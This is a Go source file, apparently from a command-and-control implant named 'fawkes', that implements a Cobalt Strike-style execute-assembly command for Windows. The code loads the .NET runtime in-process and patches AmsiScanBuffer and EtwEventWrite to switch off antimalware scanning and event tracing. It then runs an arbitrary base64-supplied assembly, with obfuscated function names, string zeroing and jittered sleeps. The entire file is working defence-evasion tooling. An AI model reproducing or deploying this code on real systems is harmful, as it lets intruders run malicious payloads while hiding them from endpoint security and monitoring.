//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"fawkes/pkg/obfuscate"
	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

// executeAssemblyAction provides single-command .NET assembly execution:
// auto-init CLR + auto-patch AMSI/ETW + load assembly + execute + capture output.
// This is the equivalent of Cobalt Strike's execute-assembly — one step instead of
// requiring separate start-clr and inline-assembly commands.
func executeAssemblyAction(assemblyB64, arguments string) structs.CommandResult {
	var output strings.Builder

	if assemblyB64 == "" {
		return errorResult("Error: assembly (base64-encoded .NET assembly bytes) is required\nUsage: start-clr -action execute-assembly -assembly <base64> [-arguments 'arg1 arg2']")
	}

	// Decode assembly bytes
	assemblyBytes, err := base64.StdEncoding.DecodeString(assemblyB64)
	if err != nil {
		// Try raw base64 (no padding)
		assemblyBytes, err = base64.RawStdEncoding.DecodeString(assemblyB64)
		if err != nil {
			return errorf("Error decoding assembly: %v (expected base64-encoded .NET assembly bytes)", err)
		}
	}

	if len(assemblyBytes) < 2 || assemblyBytes[0] != 'M' || assemblyBytes[1] != 'Z' {
		output.WriteString("[!] WARNING: Assembly doesn't start with MZ header — may not be a valid PE/.NET assembly\n")
	}

	// Step 1: Ensure CLR is initialized with AMSI+ETW auto-patching
	assemblyMutex.Lock()
	if !clrStarted {
		output.WriteString("[*] Auto-initializing CLR v4 with AMSI+ETW patching...\n")

		// Redirect stdout/stderr for output capture
		if err := clr.RedirectStdoutStderr(); err != nil {
			output.WriteString(fmt.Sprintf("[-] Output redirection warning: %v\n", err))
		}

		// Initialize CLR with retry
		var loadErr error
		for attempt := 1; attempt <= 3; attempt++ {
			runtimeHost, loadErr = clr.LoadCLR("v4")
			if loadErr == nil {
				break
			}
			if strings.Contains(loadErr.Error(), "cannot find the file") {
				jitterSleep(300*time.Millisecond, 700*time.Millisecond)
				continue
			}
			break
		}
		if loadErr != nil {
			assemblyMutex.Unlock()
			return errorResult(output.String() + fmt.Sprintf("CLR initialization failed: %v", loadErr))
		}
		clrStarted = true
		output.WriteString("[+] CLR v4 initialized\n")

		// Load AMSI DLL for patching
		if err := loadAMSI(); err != nil {
			output.WriteString(fmt.Sprintf("[-] AMSI.dll load warning: %v\n", err))
		}
	} else {
		output.WriteString("[*] CLR already running\n")
	}
	assemblyMutex.Unlock()

	// Step 2: Auto-patch AMSI (if not already patched)
	if !amsiPatched {
		amsiDll := obfuscate.AmsiDll()
		defer obfuscate.Zero(amsiDll)
		amsiFunc := obfuscate.AmsiScanBuffer()
		defer obfuscate.Zero(amsiFunc)

		_, patchErr := PerformRetPatch(amsiDll, amsiFunc)
		if patchErr != nil {
			output.WriteString(fmt.Sprintf("[-] AMSI patch failed: %v (assembly may be blocked)\n", patchErr))
		} else {
			amsiPatched = true
			output.WriteString("[+] AMSI bypassed (ret patch)\n")
		}
	} else {
		output.WriteString("[+] AMSI already patched\n")
	}

	// Step 3: Auto-patch ETW
	ntdll := obfuscate.NtdllDll()
	defer obfuscate.Zero(ntdll)
	etwFunc := obfuscate.EtwEventWrite()
	defer obfuscate.Zero(etwFunc)

	_, etwErr := PerformRetPatch(ntdll, etwFunc)
	if etwErr != nil {
		// Not fatal — ETW patch is optional
		if !strings.Contains(etwErr.Error(), "already patched") {
			output.WriteString(fmt.Sprintf("[-] ETW patch warning: %v\n", etwErr))
		}
	} else {
		output.WriteString("[+] ETW silenced (ret patch)\n")
	}

	// Step 4: Parse arguments
	var args []string
	if arguments != "" {
		args = parseAssemblyArgs(arguments)
	}

	output.WriteString(fmt.Sprintf("\n[*] Executing assembly (%d bytes, %d args)...\n", len(assemblyBytes), len(args)))
	output.WriteString(strings.Repeat("-", 60) + "\n")

	// Step 5: Execute the assembly
	assemblyOutput, execErr := ExecuteNETAssembly(assemblyBytes, args)
	if execErr != nil {
		output.WriteString(fmt.Sprintf("\n[!] Execution error: %v\n", execErr))
		if strings.Contains(execErr.Error(), "0x8007000b") {
			output.WriteString("[!] AMSI may have blocked this assembly despite patching.\n")
			output.WriteString("[!] Try: start-clr -amsi_patch 'Hardware Breakpoint' then inline-assembly.\n")
		}
		return errorResult(output.String())
	}

	if assemblyOutput != "" {
		output.WriteString(assemblyOutput)
	}
	output.WriteString("\n" + strings.Repeat("-", 60) + "\n")
	output.WriteString("[+] Assembly execution complete")

	return successResult(output.String())
}

// parseAssemblyArgs splits a space-separated argument string, respecting quoted strings.
func parseAssemblyArgs(input string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(input); i++ {
		c := input[i]
		switch {
		case !inQuote && (c == '"' || c == '\''):
			inQuote = true
			quoteChar = c
		case inQuote && c == quoteChar:
			inQuote = false
		case !inQuote && c == ' ':
			if current.Len() > 0 {
				args = append(args, current.String())
				current.Reset()
			}
		default:
			current.WriteByte(c)
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}
